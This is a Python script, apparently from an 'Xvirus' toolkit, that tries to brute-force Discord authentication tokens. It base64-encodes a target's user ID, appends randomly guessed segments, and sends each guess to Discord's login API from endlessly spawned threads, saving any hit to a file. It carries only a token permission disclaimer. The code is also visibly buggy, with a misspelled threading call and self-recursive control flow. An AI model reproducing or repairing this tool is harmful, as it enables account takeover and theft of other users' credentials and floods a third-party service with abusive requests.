import threading
from discord.ext import commands
import discord
import pyautogui
import time
from requests import post
from random import randint
import re
import http.client
import random
import json
import requests
from threading import Thread
from requests import Session
import base64
import string
import sys


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text



def spammer():
    print("Xvirus token brute-force. PS: This might take a long time to work.")
    print("If you are extremly lucky and be able to get someones token you will find it in brute-force.txt")
    print('''Do not do this without the permission of the person to whom the bruteforce attack is conducted.''')


    id_to_token = base64.b64encode((input("Id of user: ")).encode("ascii"))
    id_to_token = str(id_to_token)[2:-1]

    def bruteforece():
        while id_to_token == id_to_token:
            token = id_to_token + '.' + ('').join(
                random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
                        '').join(random.choices(string.ascii_letters + string.digits, k=25))

            headers = {'Authorization': token}

            login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
            try:
                if login.status_code == 200:
                    print('[+] VALID' + ' ' + token)
                    f = open('brute-force.txt', "a+")
                    f.write(f'{token}\n')
                else:
                    print('[-] INVALID' + ' ' + token)
            finally:
                print('')

    def thread():
        while True:
                hreading.Thread(target=bruteforece).start()

    thread()

    exit = input('press any key: ')
    exit = spammer()

spammer()

     